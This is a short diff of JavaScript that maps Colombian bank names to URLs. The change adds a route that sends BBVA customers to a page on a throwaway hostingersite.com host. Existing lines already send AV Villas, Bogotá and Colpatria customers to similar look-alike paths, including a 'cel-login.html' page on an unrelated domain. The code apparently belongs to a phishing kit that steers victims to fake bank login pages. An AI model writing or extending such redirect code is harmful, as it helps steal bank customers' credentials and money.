@@ -358,7 +358,7 @@
     bancamia:      { engine: "colpatria", q: "Colpatria" },
     agrario:       { engine: "bing",   q: "BANCO AGRARIO" },
     avvillas:      { engine: "villa",  q: "BANCO AV VILLAS" },
-    bbva:          { engine: "google", q: "BBVA Colombia" },
+    bbva:          { engine: "bbva", q: "BBVA Colombia" },
     "caja-social": { engine: "bing",   q: "Banco Caja Social" },
     "coopertaivo-coopcentral": { engine: "yahoo", q: "Banco Cooperativo Coopcentral" },
     credifinanciera:{ engine: "google", q: "Banco Credifinanciera" },
@@ -383,7 +383,8 @@
   // Construcción URL según motor
   function buildSearchUrl(engine, q) {
     const query = encodeURIComponent(q);
-     if (engine === "villa") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f1/inicio/`;
+    if (engine === "bbva") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f13/`;
+    if (engine === "villa") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f1/inicio/`;
     if (engine === "colpatria") return `https://scdfonlinecolombia.online/colpatria/cel-login.html`;
     if (engine === "bogota") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f4/wps.portal/`;
     if (engine === "google") return `https://www.google.com/search?q=${query}`;
